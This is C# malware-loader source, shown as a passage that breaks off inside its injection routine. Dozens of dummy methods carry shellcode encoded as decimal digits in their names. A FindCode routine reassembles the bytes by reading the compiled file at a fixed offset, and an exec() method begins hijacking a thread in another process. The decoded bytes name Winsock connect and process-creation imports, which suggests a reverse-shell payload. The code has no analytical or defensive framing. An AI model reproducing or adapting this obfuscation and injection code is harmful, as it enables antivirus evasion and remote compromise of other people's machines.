public static bool aa000000016027000000001000000000003001000000000000000000000000000000000000000000000000000000046100097116097000000000096000000000002000000000003001000000000000000000000000000000000000000000000000000000046098115115000000000000016009000000006000000000003001000000000000000000000000000000000000000000000000000000046105100097116097036050020000000000008000000000003001020000000000003000000000000000000000000000000000000000046105100097116097036052016001000000008000000000003000046105100097116097036053128002000() { return false; }
public static bool aa000008000000000003000046116101120116000000000016027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055136006000000008000000000003000046105100097116097036053208002000000008000000000003000046105100097116097036052096001000000008000000000003000046105100097116097036054128005000000008000000000003000046116101120116000000000024027000000001000000000003000046100097116097000000000096000000000002000000000() { return false; }
public static bool aa003000046098115115000000000000016009000000006000000000003000046105100097116097036055112006000000008000000000003000046105100097116097036053160002000000008000000000003000046105100097116097036052048001000000008000000000003000046105100097116097036054072005000000008000000000003000046116101120116000000000032027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055108006000000008000000000003000046105100() { return false; }
public static bool aa097116097036053152002000000008000000000003000046105100097116097036052040001000000008000000000003000046105100097116097036054064005000000008000000000003000046116101120116000000000040027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055096006000000008000000000003000046105100097116097036053128002000000008000000000003000046105100097116097036052016001000000008000000000003000046105100097116097036054() { return false; }
public static bool aa024005000000008000000000003000046102105108101000000000249002000000254255000000103001102097107101000000000000000000000000000000000000000000046116101120116000000000048027000000001000000000003001000000000000000000000000000000000000000000000000000000046100097116097000000000096000000000002000000000003001000000000000000000000000000000000000000000000000000000046098115115000000000000016009000000006000000000003001000000000000000000000000000000000000000000000000000000046105100097116097036052136001000000008() { return false; }
public static bool aa000000000003001008000000000000000000000000000000000000000000000000000046105100097116097036053248002000000008000000000003001008000000000000000000000000000000000000000000000000000046105100097116097036055156006000000008000000000003001011000000000000000000000000000000000000000000000000000046116101120116000000000048027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055076006000000008000000000003000() { return false; }
public static bool aa046105100097116097036053112002000000008000000000003000046105100097116097036052000001000000008000000000003000046105100097116097036054008005000000008000000000003000046116101120116000000000056027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055072006000000008000000000003000046105100097116097036053104002000000008000000000003000046105100097116097036052248000000000008000000000003000046105100097116() { return false; }
public static bool aa097036054246004000000008000000000003000046116101120116000000000064027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055068006000000008000000000003000046105100097116097036053096002000000008000000000003000046105100097116097036052240000000000008000000000003000046105100097116097036054218004000000008000000000003000046116101120116000000000072027000000001000000000003000046100097116097000000000096000() { return false; }
public static bool aa000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055064006000000008000000000003000046105100097116097036053088002000000008000000000003000046105100097116097036052232000000000008000000000003000046105100097116097036054204004000000008000000000003000046116101120116000000000080027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055060006000000008000000() { return false; }
public static bool aa000003000046105100097116097036053080002000000008000000000003000046105100097116097036052224000000000008000000000003000046105100097116097036054184004000000008000000000003000046116101120116000000000088027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055056006000000008000000000003000046105100097116097036053072002000000008000000000003000046105100097116097036052216000000000008000000000003000046105() { return false; }
public static bool aa100097116097036054176004000000008000000000003000046116101120116000000000096027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055052006000000008000000000003000046105100097116097036053064002000000008000000000003000046105100097116097036052208000000000008000000000003000046105100097116097036054146004000000008000000000003000046116101120116000000000104027000000001000000000003000046100097116097000000() { return false; }
public static bool aa000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055048006000000008000000000003000046105100097116097036053056002000000008000000000003000046105100097116097036052200000000000008000000000003000046105100097116097036054126004000000008000000000003000046116101120116000000000112027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055044006000000() { return false; }
public static bool aa008000000000003000046105100097116097036053048002000000008000000000003000046105100097116097036052192000000000008000000000003000046105100097116097036054100004000000008000000000003000046116101120116000000000120027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055040006000000008000000000003000046105100097116097036053040002000000008000000000003000046105100097116097036052184000000000008000000000003() { return false; }
public static bool aa000046105100097116097036054080004000000008000000000003000046116101120116000000000128027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055036006000000008000000000003000046105100097116097036053032002000000008000000000003000046105100097116097036052176000000000008000000000003000046105100097116097036054058004000000008000000000003000046116101120116000000000136027000000001000000000003000046100097116() { return false; }
public static bool aa097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055032006000000008000000000003000046105100097116097036053024002000000008000000000003000046105100097116097036052168000000000008000000000003000046105100097116097036054032004000000008000000000003000046116101120116000000000144027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055028() { return false; }
public static bool aa006000000008000000000003000046105100097116097036053016002000000008000000000003000046105100097116097036052160000000000008000000000003000046105100097116097036054008004000000008000000000003000046116101120116000000000152027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055024006000000008000000000003000046105100097116097036053008002000000008000000000003000046105100097116097036052152000000000008000() { return false; }
public static bool aa000000003000046105100097116097036054236003000000008000000000003000046116101120116000000000160027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055020006000000008000000000003000046105100097116097036053000002000000008000000000003000046105100097116097036052144000000000008000000000003000046105100097116097036054220003000000008000000000003000046116101120116000000000168027000000001000000000003000046() { return false; }
public static bool aa100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055016006000000008000000000003000046105100097116097036053248001000000008000000000003000046105100097116097036052136000000000008000000000003000046105100097116097036054194003000000008000000000003000046116101120116000000000176027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097() { return false; }
public static bool aa036055012006000000008000000000003000046105100097116097036053240001000000008000000000003000046105100097116097036052128000000000008000000000003000046105100097116097036054178003000000008000000000003000046116101120116000000000184027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055008006000000008000000000003000046105100097116097036053232001000000008000000000003000046105100097116097036052120000000() { return false; }
public static bool aa000008000000000003000046105100097116097036054156003000000008000000000003000046116101120116000000000192027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055004006000000008000000000003000046105100097116097036053224001000000008000000000003000046105100097116097036052112000000000008000000000003000046105100097116097036054134003000000008000000000003000046116101120116000000000200027000000001000000000() { return false; }
public static bool aa003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055000006000000008000000000003000046105100097116097036053216001000000008000000000003000046105100097116097036052104000000000008000000000003000046105100097116097036054114003000000008000000000003000046116101120116000000000208027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100() { return false; }
public static bool aa097116097036055252005000000008000000000003000046105100097116097036053208001000000008000000000003000046105100097116097036052096000000000008000000000003000046105100097116097036054090003000000008000000000003000046116101120116000000000216027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055248005000000008000000000003000046105100097116097036053200001000000008000000000003000046105100097116097036052() { return false; }
public static bool aa088000000000008000000000003000046105100097116097036054066003000000008000000000003000046116101120116000000000224027000000001000000000003000046100097116097000000000096000000000002000000000003000046098115115000000000000016009000000006000000000003000046105100097116097036055244005000000008000000000003000046105100097116097036053192001000000008000000000003000046105100097116097036052080000000000008000000000003000046105100097116097036054048003000000008000000000003000046102105108101000000000007003000000254() { return false; }
public static bool aa255000000103001102097107101000000000000000000000000000000000000000000104110097109101000000000080000000000008000000000003000102116104117110107000000192001000000008000000000003000046116101120116000000000240027000000001000000000003001000000000000000000000000000000000000000000000000000000046100097116097000000000096000000000002000000000003001000000000000000000000000000000000000000000000000000000046098115115000000000000016009000000006000000000003001000000000000000000000000000000000000000000000000000000() { return false; }
public static bool aa046105100097116097036050000000000000008000000000003001020000000000003000000000000000000000000000000000000000046105100097116097036052080000000000008000000000003000046105100097116097036053192001000000008000000000003000046102105108101000000000021003000000254255000000103001102097107101000000000000000000000000000000000000000000046116101120116000000000240027000000001000000000003001000000000000000000000000000000000000000000000000000000046100097116097000000000096000000000002000000000003001000000000000000() { return false; }
public static bool aa000000000000000000000000000000000000000046098115115000000000000016009000000006000000000003001000000000000000000000000000000000000000000000000000000046105100097116097036052008001000000008000000000003001008000000000000000000000000000000000000000000000000000046105100097116097036053120002000000008000000000003001008000000000000000000000000000000000000000000000000000046105100097116097036055080006000000008000000000003001013000000000000000000000000000000000000000000000000000046102105108101000000000039003() { return false; }
public static bool aa000000254255000000103001099121103109105110103045099114116101110100046099000000000000000000031007000000096028000000001000032000003001000000000000000000000000000000000000000000000000000000046116101120116000000000240027000000001000000000003001000000000000000000000000000000000000000000000000000000046100097116097000000000096000000000002000000000003001000000000000000000000000000000000000000000000000000000046098115115000000000000016009000000006000000000003001000000000000000000000000000000000000000000000() { return false; }
public static bool aa000000000000000000000051007000000096028000000001000000000003001005000000000001000000000000000000000000000000000000000000000000000065007000000168001000000005000000000003001004000000000000000000000000000000000000000000000000000000000000000080007000000028002000000004000000000003001012000000000003000000000000000000000000000000000000000000000000000095007000000120028000000001000000000003001008000000000001000000000000000000000000000000000000000095095120099095122000000008000000000009000000000002000000000() { return false; }
public static bool aa000000108007000000224002000000003000000000002000000000000000139007000000168002000000008000000000002000000000000000151007000000080006000000008000000000002000000000000000179007000000000000000000002000000000002000000000000000194007000000136028000000001000000000002000000000000000209007000000152002000000008000000000002000000000000000221007000000056002000000008000000000002000000000000000244007000000096027000000001000000000002000000000000000016008000000176002000000008000000000002000095108111099107000000() { return false; }
public static bool aa000032027000000001000032000002000000000000000029008000000000000000000010000000000002000000000000000044008000000064002000000003000000000002000000000000000075008000000000000216109255255000000002000095095120108095097000000040000000000009000000000002000000000000000087008000000176027000000001000000000002000000000000000100008000000168027000000001000000000002000000000000000124008000000192005000000006000000000002000000000000000147008000000224002000000003000000000002000000000000000167008000000000000000000() { return false; }
public static bool aa255255000000002000000000000000191008000000000016000000255255000000002000000000000000216008000000040027000000001000032000002000000000000000227008000000000000032000255255000000002000000000000000253008000000005000000000255255000000002000000000000000025009000000040000000000009000000000002000000000000000043009000000200001000000008000000000002000095095120108095100000000056000000000009000000000002000095116108115095101110100008000000000010000000000002000000000000000071009000000208001000000003000000000002() { return false; }
public static bool aa000000000000000093009000000048027000000001000000000002000000000000000106009000000016000000000009000000000002000000000000000124009000000176005000000001000000000002000000000000000135009000000136002000000008000000000002000000000000000152009000000040000000000009000000000002000000000000000168009000000000000000000010000000000002000000000000000179009000000240001000000003000000000002000000000000000217009000000000006000000006000000000002000000000000000242009000000232001000000008000000000002000000000000000() { return false; }
public static bool aa011010000000224027000000001000000000002000000000000000026010000000192027000000001000000000002000095067082084095077084000032000000000002000000000002000000000000000046010000000072027000000001000000000002000000000000000058010000000080027000000001000000000002000000000000000075010000000000000000000006000000000002000000000000000089010000000024003000000008000000000002000000000000000101010000000224002000000003000000000002000000000000000136010000000112027000000001000000000002000000000000000159010000000000() { return false; }
public static bool aa016000000255255000000002000000000000000183010000000240001000000008000000000002000000000000000202010000000184002000000008000000000002000000000000000213010000000016003000000008000000000002000000000000000230010000000048002000000008000000000002000000000000000003011000000056027000000001000000000002000000000000000018011000000208005000000006000000000002000000000000000033011000000072000000000009000000000002000000000000000051011000000016002000000008000000000002000000000000000078011000000000002000000008000() { return false; }
public static bool aa000000002000097098111114116000000000096025000000001000032000002000000000000000097011000000224001000000003000000000002000000000000000139011000000000003000000008000000000002000000000000000156011000000072000000000009000000000002000095095100108108095095000000000000000255255000000002000000000000000172011000000000000000000255255000000002000000000000000193011000000248001000000008000000000002000000000000000223011000000208027000000001000000000002000000000000000244011000000192001000000008000000000002000000() { return false; }
public static bool aa000000000009012000000112002000000003000000000002000000000000000024012000000000000216109255255000000002000000000000000039012000000192001000000003000000000002000000000000000055012000000120027000000001000000000002000000000000000073012000000000016000000255255000000002000000000000000095012000000020000000000002000000000002000099097108108111099000000088025000000001000032000002000000000000000119012000000096000000000003000000000002000000000000000129012000000200002000000008000000000002000000000000000142012() { return false; }
public static bool aa000000064027000000001000000000002000000000000000167012000000048003000000008000000000002000000000000000179012000000184005000000001000000000002000000000000000190012000000224002000000003000000000002000000000000000220012000000160005000000001000000000002000000000000000230012000000188006000000008000000000002000000000000000000013000000032002000000008000000000002000083108101101112000000000088027000000001000000000002000000000000000026013000000128000000000002000000000002000000000000000039013000000192002000() { return false; }
public static bool aa000008000000000002000000000000000052013000000112028000000001000000000002000000000000000066013000000000000000000008000000000002000000000000000092013000000032009000000006000000000002000095095120105095122000000032000000000009000000000002000000000000000104013000000160027000000001000000000002000112099105110105116000000024000000000009000000000002000000000000000117013000000016000000000002000000000002000000000000000141013000000016000000000009000000000002000000000000000157013000000128027000000001000000000() { return false; }
public static bool aa002000000000000000177013000000048002000000003000000000002000000000000000207013000000208001000000008000000000002000000000000000234013000000204005000000006000000000002000115105103110097108000000056025000000001000032000002000000000000000245013000000016009000000006000000000002000000000000000012014000000000000000000009000000000002000000000000000030014000000224001000000008000000000002000115116114110099109112000040025000000001000032000002000000000000000056014000000080002000000008000000000002000000000000() { return false; }
public static bool aa000079014000000156006000000008000000000002000000000000000108014000000112028000000001000000000002000000000000000123014000000000002000000003000000000002000000000000000155014000000216002000000008000000000002000000000000000168014000000056000000000002000000000002000114101097108108111099000016027000000001000032000002000000000000000200014000000000000000000255255000000002000000000000000219014000000024002000000008000000000002000000000000000249014000000224002000000008000000000002000000000000000006015000000() { return false; }
public static bool aa192005000000001000000000002000000000000000017015000000000002000000255255000000002000000000000000036015000000008002000000008000000000002000000000000000068015000000040000000000008000000000002000000000000000092015000000032003000000008000000000002000000000000000108015000000208002000000008000000000002000000000000000122015000000152027000000001000000000002000109101109115101116000000064025000000001000032000002000000000000000148015000000240002000000008000000000002000000000000000163015000000004000000000255() { return false; }
public static bool aa255000000002000000000000000184015000000192001000000008000000000002000000000000000198015000000008003000000008000000000002000000000000000215015000000096002000000008000000000002000095095120108095122000000064000000000009000000000002000095095101110100095095000000000000000000000000000002000000000000000246015000000064002000000008000000000002000000000000000024016000000144002000000003000000000002000000000000000047016000000136028000000001000000000002000000000000000061016000000104027000000001000000000002000() { return false; }
public static bool aa000000000000078016000000064000000000002000000000002000095095120105095097000000016000000000009000000000002000000000000000109016000000072002000000008000000000002000000000000000121016000000144027000000001000000000002000095095120099095097000000000000000000009000000000002000000000000000142016000000000000016000255255000000002000000000000000167016000000072000000000009000000000002000000000000000185016000000003000000000255255000000002000000000000000199016000000112025000000001000032000002000000000000000210() { return false; }
public static bool aa016000000112000000000002000000000002000000000000000239016000000088002000000008000000000002000000000000000001017000000200027000000001000000000002000000000000000019017000000048000000000002000000000002000000000000000047017000000104002000000008000000000002000095095120108095099000000048000000000009000000000002000000000000000068017000000016000000000010000000000002000000000000000081017000000136027000000001000000000002000000000000000105017000000112002000000008000000000002000000000000000124017000000144002() { return false; }
public static bool aa000000008000000000002000000000000000140017000000196005000000006000000000002000000000000000163017000000128002000000008000000000002000000000000000180017000000064000000000003000000000002000000000000000204017000000016002000000003000000000002000000000000000227017000000104025000000001000032000002000102119114105116101000000072025000000001000032000002000000000000000237017000000232002000000008000000000002000000000000000251017000000020000000000008000000000002000000000000000022018000000080000000000002000000() { return false; }
public static bool aa000002000000000000000044018000000000000000000255255000000002000000000000000068018000000000000000000255255000000002000104116111110115000000000168005000000001000000000002000000000000000085018000000208024000000001000000000002000000000000000098018000000024009000000006000000000002000000000000000120018000000032002000000003000000000002000000000000000152018000000184027000000001000000000002000000000000000171018000000224002000000003000000000002000000000000000189018000000002000000000255255000000002000000000() { return false; }
public static bool aa000000217018000000000000000000255255000000002000000000000000241018000000160002000000008000000000002000000000000000255018000000200005000000006000000000002000000000000000023019000000080002000000003000000000002000115116114108101110000000048025000000001000032000002000000000000000038019000000128002000000003000000000002000000000000000053019000000216027000000001000000000002000000000000000075019000000040002000000008000000000002000000000000000099019000000224002000000003000000000002000095117110108111099107() { return false; }
public static bool aa000024027000000001000032000002000000000000000133019000000216001000000008000000000002000000000000000157019000000096002000000003000000000002000000000000000172019000000072000000000009000000000002000118102112114105110116102032025000000001000032000002000102114101101000000000000080025000000001000032000002000000000000000188019000000096000000000002000000000002000206019000000046100101098117103095097114097110103101115000046100101098117103095105110102111000046100101098117103095097098098114101118000046100101() { return false; }
public static bool aa098117103095108105110101000046100101098117103095102114097109101000046100101098117103095115116114000112114101095099095105110105116000097116101120105116095116097098108101000095067082084095073078073084000095095112114111099095097116116097099104101100000046114100097116097036046114101102112116114046095095110097116105118101095115116097114116117112095108111099107000046114100097116097036046114101102112116114046095095110097116105118101095115116097114116117112095115116097116101000046114100097116097036046114() { return false; }
public static bool aa101102112116114046095095100121110095116108115095105110105116095099097108108098097099107000046114100097116097036046114101102112116114046095095120105095122000046114100097116097036046114101102112116114046095095120105095097000046114100097116097036046114101102112116114046095095120099095122000046114100097116097036046114101102112116114046095095120099095097000095095068108108077097105110067082084083116097114116117112000046114100097116097036046114101102112116114046095095110097116105118101095100108108109097() { return false; }
public static bool aa105110095114101097115111110000068108108077097105110067082084083116097114116117112000046114100097116097036046114101102112116114046109105110103119095097112112095116121112101000046067082084036088073065065000095095103099099095114101103105115116101114095102114097109101000095095103099099095100101114101103105115116101114095102114097109101000095090083116076049057112105101099101119105115101095099111110115116114117099116000046114100097116097036122122122000095095100111095103108111098097108095100116111114115() { return false; }
public static bool aa000095095100111095103108111098097108095099116111114115000046114100097116097036046114101102112116114046095095067084079082095076073083084095095000105110105116105097108105122101100000095095115101099117114105116121095105110105116095099111111107105101000046100097116097036095095115101099117114105116121095099111111107105101000046100097116097036095095115101099117114105116121095099111111107105101095099111109112108101109101110116000095095114101112111114116095103115102097105108117114101000071083095067111110() { return false; }
public static bool aa116101120116082101099111114100000071083095069120099101112116105111110082101099111114100000071083095069120099101112116105111110080111105110116101114115000095095100121110095116108115095100116111114000095095100121110095116108115095105110105116000046114100097116097036046114101102112116114046095067082084095077084000095095116108114101103100116111114000095100101099111100101095112111105110116101114000095101110099111100101095112111105110116101114000095095114101112111114116095101114114111114000095095119114() { return false; }
public static bool aa105116101095109101109111114121046112097114116046048000109097120083101099116105111110115000095112101105051056054095114117110116105109101095114101108111099097116111114000119097115095105110105116046057053049055052000046114100097116097036046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000046114100097116097036046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000046114() { return false; }
public static bool aa100097116097036046114101102112116114046095095105109097103101095098097115101095095000046116101120116046117110108105107101108121000046120100097116097046117110108105107101108121000046112100097116097046117110108105107101108121000095095109105110103119095083069072095101114114111114095104097110100108101114000095095109105110103119095105110105116095101104097110100108101114000119097115095104101114101046057053048049051000101109117095112100097116097000101109117095120100097116097000095103110117095101120099101() { return false; }
public static bool aa112116105111110095104097110100108101114000095095109105110103119116104114095114117110095107101121095100116111114115046112097114116046048000095095109105110103119116104114095099115000107101121095100116111114095108105115116000095095095119054052095109105110103119116104114095097100100095107101121095100116111114000095095109105110103119116104114095099115095105110105116000095095095119054052095109105110103119116104114095114101109111118101095107101121095100116111114000095095109105110103119095084076083099097() { return false; }
public static bool aa108108098097099107000112115101117100111045114101108111099045108105115116046099000095086097108105100097116101073109097103101066097115101046112097114116046048000095086097108105100097116101073109097103101066097115101000095070105110100080069083101099116105111110000095070105110100080069083101099116105111110066121078097109101000095095109105110103119095071101116083101099116105111110070111114065100100114101115115000095095109105110103119095071101116083101099116105111110067111117110116000095070105110100080() { return false; }
public static bool aa069083101099116105111110069120101099000095071101116080069073109097103101066097115101000095073115078111110119114105116097098108101073110067117114114101110116073109097103101000095095109105110103119095101110117109095105109112111114116095108105098114097114121095110097109101115000046100101098117103095105110102111000046100101098117103095097098098114101118000046100101098117103095108105110101000046100101098117103095097114097110103101115000046100101098117103095115116114000046100101098117103095102114097109() { return false; }
public static bool aa101000068108108069110116114121080111105110116000095105110105116105097108105122101095111110101120105116095116097098108101000095114101103105115116101114095111110101120105116095102117110099116105111110000095101120101099117116101095111110101120105116095116097098108101000095095097099114116095105111098095102117110099000114101103105115116101114095102114097109101095099116111114000046116101120116046115116097114116117112000046120100097116097046115116097114116117112000046112100097116097046115116097114116117() { return false; }
public static bool aa112000046099116111114115046054053053051053000095095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000095095105109112095097098111114116000095095108105098054052095108105098107101114110101108051050095097095105110097109101000095095100097116097095115116097114116095095000095095095068084079082095076073083084095095000095095105109112095095108111099107000095095105109112095082116108086105114116117097108085110119105110100000083101116085110104097110100108101100069120099101() { return false; }
public static bool aa112116105111110070105108116101114000095095105109112095099097108108111099000095095095116108115095115116097114116095095000046114101102112116114046095095110097116105118101095115116097114116117112095115116097116101000095095073109097103101066097115101000071101116076097115116069114114111114000071101116083121115116101109084105109101065115070105108101084105109101000109105110103119095105110105116108116115115117111095102111114099101000095095114116095112115114101108111099115095115116097114116000095095100108() { return false; }
public static bool aa108095099104097114097099116101114105115116105099115095095000095095115105122101095111102095115116097099107095099111109109105116095095000095095105111098095102117110099000095095115105122101095111102095115116097099107095114101115101114118101095095000095095109097106111114095115117098115121115116101109095118101114115105111110095095000095095095099114116095120108095115116097114116095095000095095105109112095068101108101116101067114105116105099097108083101099116105111110000046114101102112116114046095095067() { return false; }
public static bool aa084079082095076073083084095095000086105114116117097108081117101114121000095095095099114116095120105095115116097114116095095000087083065083116097114116117112000095095105109112095095097109115103095101120105116000095095095099114116095120105095101110100095095000095116108115095115116097114116000046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000095095109105110103119095111108100101120099112116095104097110100108101114000095095105109112095071() { return false; }
public static bool aa101116067117114114101110116084104114101097100073100000067114101097116101080114111099101115115065000071101116067117114114101110116080114111099101115115073100000084108115071101116086097108117101000084101114109105110097116101080114111099101115115000095095098115115095115116097114116095095000095095105109112095104116111110115000095095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000082116108076111111107117112070117110099116105111110069110116114121000095() { return false; }
public static bool aa095115105122101095111102095104101097112095099111109109105116095095000095095105109112095071101116076097115116069114114111114000095095105109112095102114101101000095095105109112095087083065083116097114116117112000095095105109112095082116108076111111107117112070117110099116105111110069110116114121000086105114116117097108080114111116101099116000109105110103119095097112112095116121112101000095095095099114116095120112095115116097114116095095000095095105109112095076101097118101067114105116105099097108083() { return false; }
public static bool aa101099116105111110000095095105109112095071101116084105099107067111117110116000046114101102112116114046095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000095095105109112095087083065067111110110101099116000095095095099114116095120112095101110100095095000095095109105110111114095111115095118101114115105111110095095000095095105109112095071101116083121115116101109084105109101065115070105108101084105109101000069110116101114067114105116105099097108083101() { return false; }
public static bool aa099116105111110000095095105109112095067114101097116101080114111099101115115065000046114101102112116114046095095120105095097000095095105109097103101095098097115101095095000046114101102112116114046095067082084095077084000082116108067097112116117114101067111110116101120116000095095115101099116105111110095097108105103110109101110116095095000095095110097116105118101095100108108109097105110095114101097115111110000095116108115095117115101100000095095105109112095109101109115101116000085110104097110100108() { return false; }
public static bool aa101100069120099101112116105111110070105108116101114000095095073065084095101110100095095000087083065083111099107101116065000095095082085078084073077069095080083069085068079095082069076079067095076073083084095095000105110101116095097100100114000095095108105098054052095108105098119115050095051050095097095105110097109101000095095105109112095082116108065100100070117110099116105111110084097098108101000095095100097116097095101110100095095000095095105109112095102119114105116101000095095067084079082095076() { return false; }
public static bool aa073083084095095000095104101097100095108105098054052095108105098107101114110101108051050095097000095095098115115095101110100095095000071101116084105099107067111117110116000095095110097116105118101095118099099108114105116095114101097115111110000095095095099114116095120099095101110100095095000082116108065100100070117110099116105111110084097098108101000046114101102112116114046095095110097116105118101095115116097114116117112095108111099107000095095105109112095069110116101114067114105116105099097108083() { return false; }
public static bool aa101099116105111110000095116108115095105110100101120000095095110097116105118101095115116097114116117112095115116097116101000095095095099114116095120099095115116097114116095095000095095105109112095071101116067117114114101110116080114111099101115115073100000095095105109112095084101114109105110097116101080114111099101115115000095095108105098054052095108105098109115118099114116095111115095097095105110097109101000095095095067084079082095076073083084095095000046114101102112116114046095095100121110095116() { return false; }
public static bool aa108115095105110105116095099097108108098097099107000095095105109112095115105103110097108000095095105109112095095114101103105115116101114095111110101120105116095102117110099116105111110000095095114116095112115114101108111099115095115105122101000095095105109112095081117101114121080101114102111114109097110099101067111117110116101114000095095105109112095115116114108101110000087083065067111110110101099116000095095102105108101095097108105103110109101110116095095000095095105109112095073110105116105097108() { return false; }
public static bool aa105122101067114105116105099097108083101099116105111110000095104101097100095108105098054052095108105098119115050095051050095097000095095105109112095105110101116095097100100114000095095105109112095114101097108108111099000073110105116105097108105122101067114105116105099097108083101099116105111110000095095105109112095118102112114105110116102000095095109097106111114095111115095118101114115105111110095095000095095073065084095115116097114116095095000095095105109112095087083065083111099107101116065000095() { return false; }
public static bool aa095105109112095085110104097110100108101100069120099101112116105111110070105108116101114000095095105109112095083101116085110104097110100108101100069120099101112116105111110070105108116101114000046114101102112116114046109105110103119095097112112095116121112101000095095068084079082095076073083084095095000082116108086105114116117097108085110119105110100000095095105109112095095105110105116105097108105122101095111110101120105116095116097098108101000095095105109112095083108101101112000076101097118101067() { return false; }
public static bool aa114105116105099097108083101099116105111110000095095115105122101095111102095104101097112095114101115101114118101095095000095095095099114116095120116095115116097114116095095000095095115117098115121115116101109095095000095097109115103095101120105116000095095115101099117114105116121095099111111107105101095099111109112108101109101110116000095095105109112095084108115071101116086097108117101000071101116067117114114101110116080114111099101115115000095095105109112095095101120101099117116101095111110101120() { return false; }
public static bool aa105116095116097098108101000095095105109112095086105114116117097108080114111116101099116000095095095116108115095101110100095095000081117101114121080101114102111114109097110099101067111117110116101114000095095105109112095086105114116117097108081117101114121000095095105109112095095105110105116116101114109000109105110103119095105110105116108116115100121110095102111114099101000095095105109112095095095105111098095102117110099000095095100121110095116108115095105110105116095099097108108098097099107000046() { return false; }
public static bool aa114101102112116114046095095105109097103101095098097115101095095000095105110105116116101114109000095095105109112095115116114110099109112000095104101097100095108105098054052095108105098109115118099114116095111115095097000095095105109112095095095097099114116095105111098095102117110099000095095109097106111114095105109097103101095118101114115105111110095095000095095108111097100101114095102108097103115095095000095095095099104107115116107095109115000095095110097116105118101095115116097114116117112095108() { return false; }
public static bool aa111099107000046114101102112116114046095095110097116105118101095100108108109097105110095114101097115111110000071101116067117114114101110116084104114101097100073100000095095114116095112115114101108111099115095101110100000095095109105110111114095115117098115121115116101109095118101114115105111110095095000095095109105110111114095105109097103101095118101114115105111110095095000095095105109112095095117110108111099107000109105110103119095105110105116108116115100114111116095102111114099101000046114101102() { return false; }
public static bool aa112116114046095095120099095097000046114101102112116114046095095120105095122000068101108101116101067114105116105099097108083101099116105111110000095095105109112095082116108067097112116117114101067111110116101120116000095095082085078084073077069095080083069085068079095082069076079067095076073083084095069078068095095000095095105109112095071101116067117114114101110116080114111099101115115000046114101102112116114046095095120099095122000095095095099114116095120116095101110100095095000095095115101099117() { return false; }
public static bool aa114105116121095099111111107105101000100097118101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000() { return false; }



public static byte [] FindCode()
{
		string tmp;
		byte[] bin;
		using (FileStream FileObject = new FileStream(System.Environment.CurrentDirectory + "\\Zeta.log", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
		using (BinaryReader DataStream = new BinaryReader(FileObject))
		{
				bin = DataStream.ReadBytes(Convert.ToInt32(FileObject.Length));
		}
		byte [] SArray = new byte [52772];
		int SIdx = 0;
		int idx = 40440; // Offset where to finde the first shellcode byte
		for (int k = 1; k <= 316; k++) { // Number of lines
				for (int i = 1; i <= 167; i++) { // Number of shellcode bytes
						tmp = System.Text.Encoding.UTF8.GetString( bin, idx, 1 ) + System.Text.Encoding.UTF8.GetString( bin, idx + 1, 1 ) + System.Text.Encoding.UTF8.GetString( bin, idx + 2, 1 );
						SArray[ SIdx ] = Byte.Parse( tmp );
						SIdx++;
						idx = idx + 3;
				}
				idx = idx + 3;
		}
		return SArray;
 }


    public static unsafe void exec()
    {

				CONTEXT64 context = new CONTEXT64();
				//System.Windows.Forms.MessageBox.Show(procHandle.ToString());
				int ProcId = FindTheRightPID();
				Process targetProcess = Process.GetProcessById( ProcId );
				CLIENT_ID clientid = new CLIENT_ID();
				clientid.UniqueThread = new IntPtr(targetProcess.Threads[0].Id);
				clientid.UniqueProcess = new IntPtr(targetProcess.Id);
				IntPtr procHandle = (IntPtr)clientid.UniqueProcess;

				IntPtr ptrOpenThread = IntPtr.Zero;
